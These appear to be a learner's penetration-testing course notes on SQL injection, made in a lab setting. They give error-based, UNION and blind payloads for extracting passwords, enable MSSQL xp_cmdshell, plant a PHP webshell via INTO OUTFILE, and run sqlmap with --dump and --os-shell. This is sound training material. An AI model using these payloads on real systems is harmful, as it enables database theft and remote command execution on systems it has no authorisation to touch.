
## 10.1 Theory and Databases

##### Theory Refresher
- SQL databses are relational
- Most popular brands are MySQL, MSSQL, PostgreSQL, and Oracle
- Front end websites automate querying of SQL databses to save time
- SQL injection is exploitation of unsanitzed chracters in automated input fields

```
//Generic select query
SELECT * FROM users WHERE user_name='leon`
```


## 5.2 Manual SQL Injection

##### Identifying SQLi via Error-based Payloads
- identify vulnerable input fields 
- escape character sanitization and progressivly test the database
- common escape:
	- `offsec' OR 1=1 -- //`
	- -- and // terminate SQL statement 

Steps
1. Identify login form
2. Attempt error-based input 
3. Query version information 
4. Start progressivly more targeted queries (may throw column error)

```
2. offsec' OR 1=1 -- //

3. ' or 1=1 in (select @@version) -- //

4. ' OR 1=1 in (SELECT * FROM users) -- //  

4. ' or 1=1 in (SELECT password FROM users) -- //

4. ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```


##### Union-based Payloads
- UNION aids exploitation by allowing extra SELECT statement to concatenate two queries into one
- query needs to match exact columns of the queried table
	- check with `' ORDER BY 1-- //`  (increment number and wait till error)
- query datatypes also important, need to match query data type with displayed front end data type (integer vs string)

Steps:
1. Identify number of columns
2. Initial query 
3. Move datatypes around for correct data presentation
4. Query other tables 
5. Target useful information

```
1. ' ORDER BY <1,2,3,4,5>-- //

2. ' UNION SELECT database(), user(), @@version, null, null -- //

3. ' UNION SELECT null, null, database(), user(), @@version  -- //

4. ' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

5. ' UNION SELECT null, username, password, description, null FROM users -- //

```


##### Blind SQL Injections
- Previous SQLi attacks have been in band (we can view displayed contents inside the web app)
- Blind SQL injections use time based logic or booleans to infer database behaviour 

Steps
1. Test for boolean-based SQLi
2. Use logic payloads to enumerate whether a user exists 

```
1. http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //

2. http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```


## 5.3 Manual and Automated Code Execution

##### Intro 
- Exploit MSSQL with xp_cmdshell
- Automate SQL injection with SQLmap
- Depending on OS, privs, and filesystem, can read and write files to underlying OS (potentially with full code execution)

##### Manual Code Execution
- xp_cmdshell function takes string and passes it to cmd for execution on target
	- function disabled by default
	- once enabled, need to call with EXECUTE insteade of SELECT
- Need appropriate account permissions 

Steps:
1. Connect to MSSQL with impacket
2. Enable xp_cmdshell 
3. Test command execution
4. Upgrade to standard reverse shell
	1. Upload php webshell to tmp dir on target via traditional SQLi (relies on SELECT INTO_OUTFILE vulnerability to write command as a file to target)
	2. Use original user input form
5. Test command execution using firefox searchbar

```
1. impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

2. SQL> EXECUTE sp_configure 'show advanced options', 1;
   SQL> RECONFIGURE;
   SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
   SQL> RECONFIGURE;

3. SQL> EXECUTE xp_cmdshell 'whoami';

4. ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

5. http://192.168.120.19/tmp/webshell.php?cmd=id
```


##### Automating the Attack
- Sqlmap can identify and exploit SQL vulnerabilities
- can be used to dump databse or get code execution

Steps (data dump):
1. Connect to URL with dummy variable (1) and parameter you want to test (gets fingerprinting info)
2. Dump databse

```
1. sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user

2. sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

Steps (shell):
1. Start Burp
2. Send request to input filed with HTTP proxy on
3. Save HTTP request to a text file
4. Use Sqlmap with HTTP request as input 

```
4. sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

Example HTTP POST request 
```
POST /search.php HTTP/1.1
Host: 192.168.50.19
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.50.19
Connection: close
Referer: http://192.168.50.19/search.php
Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
Upgrade-Insecure-Requests: 1

item=test
```